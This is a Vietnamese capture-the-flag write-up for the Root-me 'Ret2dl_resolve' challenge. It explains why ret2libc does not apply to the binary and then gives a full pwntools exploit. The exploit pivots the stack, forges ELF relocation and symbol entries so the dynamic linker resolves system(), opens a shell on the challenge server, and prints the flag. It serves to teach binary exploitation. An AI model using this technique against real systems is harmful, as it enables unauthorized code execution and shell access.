# Ret2dl_resolve
# Reverse
Thông tin về challenge trên web.
![challenge_info](https://github.com/zirami/Root-me/blob/main/ret2dl_resolve/images/challenge_info.png)
Sử dụng lệnh SCP để kéo file challenge trên web root-me về.
![pull_challenge](https://github.com/zirami/Root-me/blob/main/ret2dl_resolve/images/pull_challenge.png)
Kéo file vừa kéo về máy vào IDA để xem pseudo code.
![main_func](https://github.com/zirami/Root-me/blob/main/ret2dl_resolve/images/main_func.png)

Nhận thấy rằng, trong hàm main chỉ gọi duy nhất 1 hàm read, không thể leak địa chỉ (không có thêm bất kỳ 1 hàm nào có chức năng in ra màn hình), như vậy không thể dùng ret2libc để khai thác được. Chúng ta sẽ dùng kỹ thuật có tên là Ret2dl_resolve để giải quyết challenge này.
# Exploit

```py
from pwn import *
#r = process("./ch77")
#con_ssh = ssh(host='challenge03.root-me.org',port=2223,user='app-systeme-ch77',password='app-systeme-ch77')
#r = con_ssh.run("./ch77")
r = remote("challenge03.root-me.org","56577")
_elf = ELF("./ch77")

pause()

resolver = 0x80482d0    #push link_map and call dl_resolve
buf = 0x804af00         #controllable area (.bss)
leave_ret = 0x08048398   #gadget
SYMTAB = 0x80481cc
STRTAB = 0x804821c
JMPREL = 0x8048298

# Pivoting the stack and calling read(0, buf, 0x80)
buffer = ""
buffer += "A"*24
buffer += p32(buf)   #stack pivoting. (esp = buff)
buffer += p32(_elf.plt["read"]) + p32(leave_ret) + p32(0) + p32(buf) + p32(0x80) 


# Compute offsets and forged structures
forged_ara = buf + 0x14
rel_offset = forged_ara - JMPREL
elf32_sym = forged_ara + 0x8 #size of elf32_sym

align = 0x10 - ((elf32_sym - SYMTAB) % 0x10) #align to 0x10

elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) / 0x10

r_info = (index_sym << 8) | 0x7 

elf32_rel = p32(_elf.got['read']) + p32(r_info)
st_name = (elf32_sym + 0x10) - STRTAB
elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)

buffer2 = 'AAAA'                #fake ebp
buffer2 += p32(resolver)        # ret-to dl_resolve
buffer2 += p32(rel_offset)      #JMPRL + offset = struct
buffer2 += 'AAAA'               #fake return 
buffer2 += p32(buf+100)         # system parameter
buffer2 += elf32_rel            # (buf+0x14)
buffer2 += 'A' * align
buffer2 += elf32_sym_struct     # (buf+0x20)
buffer2 += "system\x00"
buffer2 = buffer2.ljust(100,'A')
buffer2 += "sh\x00"
p = (0x80 - len(buffer2))
buffer2 += "A" * p              #total read size

r.send(buffer)
r.send(buffer2)
r.interactive()
```
## Flag = RootMe{No_n33d_to_l34k_to_get_a_sh3LL}